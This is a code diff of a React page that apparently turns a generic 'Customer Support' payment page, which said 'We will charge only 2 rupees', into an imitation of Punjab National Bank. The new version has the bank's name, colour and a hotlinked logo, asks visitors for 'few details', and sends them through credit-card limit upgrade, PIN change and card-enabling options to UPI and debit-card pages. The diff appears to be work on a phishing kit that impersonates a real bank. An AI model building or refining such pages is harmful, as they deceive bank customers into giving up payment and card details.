@@ -8,17 +8,24 @@ export default function Page() {
     <div>
       <section className="w-full">
         {/* <!-- Harsha Web --> */}
-        <div className="h-auto w-full flex items-center justify-left bg-[#0062A9] p-1">
-          <img src="/logo.png" className="p-2 w-[60px] h-[60px]" alt="Logo" />
+        <div className="h-auto w-full flex items-center justify-left bg-[#91203e] p-1">
+          <img
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaePPd-mxequ-ctngUKynMFKVPkuogwmb5cw&s"
+            className="p-2 h-[60px]"
+            alt="Logo"
+          />
           <span className="font-semibold text-xl text-white">
-            Customer Support
+            PNB Customer Support
           </span>
         </div>
         <div className="p-6">
-          <div className="flex flex-col">
-            <span className="text-xl">Select Payment Method</span>
-            <span className="text-red-600 mt-5 text-base">We will charge only 2 rupees</span>
-          </div>
+          <h1 className="text-2xl font-bold text-[#91203e]">
+            Welcome to Punjab National Bank!
+          </h1>
+          <p className="text-sm text-slate-600 mt-2">
+            It is pleasure having you here. We would like to have few details of
+            yours.
+          </p>
           <form
             className="space-y-6 flex flex-col justify-center"
             action=""
@@ -32,11 +39,19 @@ export default function Page() {
                   router.push("/upi?method=phonepay");
                 }}
               >
-                <img
-                  src="https://cdn.freelogovectors.net/wp-content/uploads/2023/11/phonepelogo-freelogovectors.net_.png"
-                  className="h-12"
-                  alt="UPI Logo"
-                />
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="30"
+                  height="30"
+                  fill="currentColor"
+                  class="bi bi-arrow-right"
+                  viewBox="0 0 16 16"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8"
+                  />
+                </svg>
                 <label className="cursor-pointer ml-2">
                   <input
                     type="radio"
@@ -44,7 +59,7 @@ export default function Page() {
                     value="UPI"
                     className="sr-only"
                   />
-                  <span>Phone Pay</span>
+                  <span>Credit Card to Card Apply</span>
                 </label>
               </div>
               <div
@@ -53,11 +68,19 @@ export default function Page() {
                   router.push("/upi?method=googlepay");
                 }}
               >
-                <img
-                  src="https://i.pinimg.com/originals/f6/60/a6/f660a637c5ea8ef2b00218bac3479c82.png"
-                  className="h-12"
-                  alt="UPI Logo"
-                />
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="30"
+                  height="30"
+                  fill="currentColor"
+                  class="bi bi-arrow-right"
+                  viewBox="0 0 16 16"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8"
+                  />
+                </svg>
                 <label className="cursor-pointer ml-2">
                   <input
                     type="radio"
@@ -65,7 +88,7 @@ export default function Page() {
                     value="UPI"
                     className="sr-only"
                   />
-                  <span>Google Pay</span>
+                  <span>Credit Card Limit Upgrade</span>
                 </label>
               </div>
               <div
@@ -74,11 +97,19 @@ export default function Page() {
                   router.push("/upi?method=paytm");
                 }}
               >
-                <img
-                  src="https://www.primarymarkets.com/wp-content/uploads/2023/09/Paytm-Circle-Logo.webp"
-                  className="h-12"
-                  alt="UPI Logo"
-                />
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="30"
+                  height="30"
+                  fill="currentColor"
+                  class="bi bi-arrow-right"
+                  viewBox="0 0 16 16"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8"
+                  />
+                </svg>
                 <label className="cursor-pointer ml-2">
                   <input
                     type="radio"
@@ -86,24 +117,32 @@ export default function Page() {
                     value="UPI"
                     className="sr-only"
                   />
-                  <span>Paytm</span>
+                  <span>Credit Card Pin Change</span>
                 </label>
               </div>
               {/* Divider */}
-              <div className="w-full items-center justify-center flex">
+              {/* <div className="w-full items-center justify-center flex">
                 <span>Or</span>
-              </div>
+              </div> */}
               <div
                 className="flex items-center border border-slate-500 rounded p-2"
                 onClick={() => {
                   router.push("/debit");
                 }}
               >
-                <img
-                  src="https://cdn-icons-png.flaticon.com/512/6963/6963703.png"
-                  className="w-12 h-12"
-                  alt="Debit Card Logo"
-                />
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="30"
+                  height="30"
+                  fill="currentColor"
+                  class="bi bi-arrow-right"
+                  viewBox="0 0 16 16"
+                >
+                  <path
+                    fill-rule="evenodd"
+                    d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8"
+                  />
+                </svg>
                 <label className="cursor-pointer ml-2">
                   <input
                     type="radio"
@@ -111,39 +150,47 @@ export default function Page() {
                     value="Debit Card"
                     className="sr-only"
                   />
-                  <span>Debit Card</span>
+                  <span>Online enable and disable credit card</span>
                 </label>
+              </div>
+              <div className="w-full flex justify-center items-center !mt-10">
+                <button
+                  className="bg-gradient-to-r from-[#91203e] to-[#91203e] hover:from-red-700 hover:to-purple-700 text-white font-bold py-2 px-10 rounded focus:outline-none focus:shadow-outline w-full"
+                  type="submit"
+                >
+                  Submit
+                </button>
               </div>
             </div>
           </form>
           {/* <!-- Bottom Area --> */}
           <div className="mt-10">
             <div className="grid grid-cols-1 w-full">
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>FAQs: </span>
                 <span className="text-slate-600">
                   Find answers to the most frequently asked questions.
                 </span>
               </div>
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>Contact Us: </span>
                 <span className="text-slate-600">
                   Get in touch with our support team.
                 </span>
               </div>
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>Product Guides: </span>
                 <span className="text-slate-600">
                   Access detailed guides and tutorials.
                 </span>
               </div>
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>Account Management: </span>
                 <span className="text-slate-600">
                   Manage your account settings and preferences
                 </span>
               </div>
-              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
+              <div className="text-xs text-[#91203e] font-bold space-x-1 mt-2">
                 <span>Order Tracking: </span>
                 <span className="text-slate-600">
                   Track the status of your orders.
@@ -154,7 +201,7 @@ export default function Page() {
         </div>
       </section>
       {/* <!-- Footer --> */}
-      <section className="bg-[#0062A9] p-5 w-full">
+      <section className="bg-[#91203e] p-5 w-full">
         <div className="flex space-x-1 w-full justify-between">
           <span className="text-xs text-white font-bold">Contact Us</span>
           <span className="text-xs text-white font-bold">|</span>
